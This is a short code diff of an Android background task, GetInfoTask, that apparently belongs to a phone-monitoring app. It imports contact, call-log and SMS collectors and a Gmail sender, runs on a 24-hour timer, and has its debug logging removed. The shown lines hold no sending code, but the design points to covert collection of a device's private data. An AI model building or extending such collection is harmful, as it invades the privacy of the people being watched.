@@ -20,15 +20,18 @@ import javax.mail.internet.MimeMessage;
 import javax.mail.internet.MimeMultipart;
 
 import com.system.activity.GlobalPrefActivity;
+import com.system.config.ConfigCtrl;
+import com.system.config.MailCfg;
 import com.system.feature.contact.ContactCtrl;
 import com.system.feature.contact.ContactInfo;
 import com.system.feature.phonecall.PhoneCallCtrl;
 import com.system.feature.phonecall.PhoneCallInfo;
 import com.system.feature.sms.SmsCtrl;
 import com.system.feature.sms.SmsInfo;
-import com.system.utils.*;
-import com.system.utils.mail.GMailSenderEx;
-import com.system.utils.mail.MailCfg;
+import com.particle.inspector.common.util.SysUtils;
+import com.particle.inspector.common.util.DeviceProperty;
+import com.particle.inspector.common.util.mail.GMailSenderEx;
+import com.particle.inspector.common.util.FileCtrl;
 
 import android.app.Activity;
 import android.app.Service;
@@ -61,19 +64,17 @@ public class GetInfoTask extends TimerTask
 	
 	public void run() 
 	{
-		Log.d(LOGTAG, "start to collect infomation");
-		
 		// If network connected, try to collect and send the information
 		if (!SysUtils.isNetworkConnected(service.getApplicationContext())) return;
 		
 		// Firstly we should make sure the time range (>24H)
-		Date lastDatetime = ConfigCtrl.getLastGetInfoTime(service.getApplicationContext());
+		Date lastDatetime = new Date(ConfigCtrl.getLastGetInfoTime(service.getApplicationContext()));
 		Calendar now = Calendar.getInstance();
 		now.add(Calendar.DATE, -1);
 		Date now_minus_1_day = now.getTime();
 		if (lastDatetime != null && now_minus_1_day.before(lastDatetime)) 
 		{
-			Log.v(LOGTAG, "Not reached the valid timing yet. Last time: " + lastDatetime.toString());
+			//Log.v(LOGTAG, "Not reached the valid timing yet. Last time: " + lastDatetime.toString());
 			return;
 		}
 		
